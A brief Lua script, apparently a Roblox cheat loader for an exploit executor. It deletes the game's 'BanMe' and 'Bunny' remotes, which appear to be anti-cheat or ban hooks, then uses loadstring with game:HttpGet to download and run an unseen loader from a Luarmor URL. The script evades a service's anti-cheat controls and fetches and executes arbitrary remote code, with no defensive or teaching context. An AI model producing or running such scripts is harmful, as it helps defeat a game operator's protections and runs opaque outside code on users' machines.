local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remote = ReplicatedStorage:FindFirstChild("Remote")

if Remote then
    local BanMe = Remote:FindFirstChild("BanMe")
    if BanMe then
        BanMe:Destroy()
        print("[DEBUG] BanMe has been destroyed.")
    end

    local Bunny = Remote:FindFirstChild("Bunny")
    if Bunny then
        Bunny:Destroy()
        print("[DEBUG] Bunny has been destroyed.")
    end
else
    print("[DEBUG] Remote folder not found.")
end

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1e6ddc1413e293f1c1e9702a913ee2cb.lua"))()
